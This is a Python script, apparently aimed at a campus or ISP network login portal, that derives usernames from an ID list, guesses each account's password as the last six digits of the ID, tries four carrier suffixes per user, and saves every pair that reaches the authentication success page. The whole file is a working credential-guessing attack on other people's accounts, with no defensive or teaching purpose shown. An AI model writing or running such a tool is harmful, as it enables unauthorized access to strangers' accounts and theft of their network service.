from openpyxl import load_workbook
import os
import requests
from bs4 import BeautifulSoup

url = 'http://10.253.0.1/a70.html'
type = ['','@cmcc','@unicom','@telecom']
listAccounts = []
blackList = []


def loadBlackList():
    if os.path.exists('blacklist.txt') == False:
        open('blacklist.txt','w',encoding='utf-8')
    with open('blacklist.txt','r') as f:
        for line in f.readlines():
            blackList.append(line.strip())

def saveBlackList(account):
    print('Save blacklist',account['user'],account['password'])
    with open('blacklist.txt','a') as f:
       f.write(account['user']+'\n') 

def load():
    with open('accounts.txt','r') as f:
        for line in f.readlines():
            listAccounts.append(line.strip().split(" ")[0].split("@")[0])

def save(account,index):
    print('Save',account)
    with open('accounts.txt','a') as f:
        f.write(account['user']+type[index]+" "+account['password']+'\n')

def check(account,index):
    user = account['user']
    pwd = account['password']
    payload = {'DDDDD': user+type[index],'upass': pwd, '0MKKey':'123456'}
    r = requests.post(url,data=payload)
    soup = BeautifulSoup(r.text,'lxml')
    if soup.title == None:
        return False
    title = soup.title.text
    if title == "认证成功页":
        save(account,index)
        return True
    return False

def accounts():
#    workbook = load_workbook("data3.xlsx")
#    sheet = workbook["Sheet1"]
#    cells = sheet["D"]
    list = []
    with open('acc.txt','r') as f:
#       for cell in cells:
        for cell in f.readlines():
            cell = cell.strip()
            code = str(cell)[6:]
            if code in listAccounts or code in blackList: 
                print("ignore user",code)
                continue
            pwd = code[-6:]
            list.append( {"user": code, "password": pwd})
    return list

load()
loadBlackList()

accs = accounts()
for i in range(7000):
    account = accs[i]
    count = 0
    for j in range(4):
        if not check(account,j):
            count += 1
    if count == 4:
        saveBlackList(account)
